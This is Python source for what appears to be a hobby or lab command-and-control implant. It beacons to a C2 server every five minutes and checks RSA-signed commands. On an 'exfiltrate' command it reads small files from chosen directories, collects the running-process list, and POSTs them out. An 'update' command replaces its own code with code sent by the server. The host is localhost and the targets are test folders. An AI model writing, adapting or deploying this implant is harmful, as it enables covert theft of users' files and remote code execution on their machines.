from time import sleep, time
from enum import Enum
from urllib.request import urlopen, Request
from base64 import b64decode
import json
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from os import scandir
from subprocess import Popen, PIPE

class Command(Enum):
    NOP = "nop"
    EXFILTRATE = "exfiltrate"
    UPDATE = "code_update"

class ProgramRebootSignal(Exception):
    "Raised when the inner program wishes to reboot with new code"
    pass

my_id = "1"
server_url = f"http://localhost:5000/sync/{my_id}"
heartbeat_interval_seconds = 5 * 60
nonce_threshold_seconds = 15
# list of directories we recursively search for text files
exfiltrate_subtree_roots = ["C:/Users/japra/Desktop/test", "C:/Users/japra/Desktop/test2"]
max_exfiltrate_file_size = 4096

with open("publickey.pem", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
    )

"""
Recursively yield DirEntry objects for given directory
https://stackoverflow.com/questions/33135038/how-do-i-use-os-scandir-to-return-direntry-objects-recursively-on-a-directory
"""
def scantree(path):
    with scandir(path) as it:
        for entry in it:
            if entry.is_dir(follow_symlinks=False):
                yield from scantree(entry.path)
            else:
                yield entry

"""
Sends a heartbeat message to the C&C and returns the response string
"""
def heartbeat():
    print("[heartbeat] sending heartbeat")
    with urlopen(server_url) as response:
        return response.read()

"""
Executes the given command
"""
def handle_command(command, argument):
    print(f"[handle_command] handling {command} command")
    if command == Command.NOP:
        return
    elif command == Command.EXFILTRATE:
        buffer = ""

        # Scan file tree
        for subtree_root in exfiltrate_subtree_roots:
            for entry in scantree(subtree_root):
                if entry.is_file() and entry.stat().st_size <= max_exfiltrate_file_size:
                    with open(entry.path) as f:
                        buffer += f"{entry.path}:\n{f.read()}\n\n"

        # Get list of running processes
        process = Popen(['ps', '-a'], stdout=PIPE, stderr=PIPE)
        stdout, _ = process.communicate()
        buffer += stdout

        payload = json.dumps({ "data": buffer }).encode("utf-8")
        urlopen(Request(server_url, data=payload, headers={"content-type": "application/json"}))

    elif command == Command.UPDATE:
        with open("src.py", "w") as f:
            f.write(argument)
        raise ProgramRebootSignal()

"""
Decodes the given response from the server and if the signature, nonce, and id fields
are valid, executes the command 
"""
def process_response(response):
    signature = b64decode(str(response[:685], encoding="utf-8"))
    message = response[685:]
    decoded_message = str(message, encoding="utf-8")
    print(f"[process_response] processing response {decoded_message}")
    try:
        public_key.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        fields = decoded_message.split("\n")
        nonce = fields[0]
        id = fields[1]
        command = fields[2]

        if int(time()) - int(nonce) >= nonce_threshold_seconds:        
            print(f"[process_response] dropped response because it's nonce is too old")
            return

        if id != my_id:
            print(f"[process_response] dropped response because it's id does not match self")
            return

        argument = None
        if len(fields) > 3:
            arg_start_index = decoded_message.index(command) + len(command)
            argument = decoded_message[arg_start_index:]

        try:
            command = Command(command)
        except:
            print(f"[process_response] dropped response because it's command field was invalid")
            return

        handle_command(command, argument)
    except ProgramRebootSignal as e:
        raise e
    except Exception as e:
        print(e)
        print(f"[process_response] dropped response because of error above")

while True:
    response = heartbeat()
    process_response(response)
    sleep(heartbeat_interval_seconds)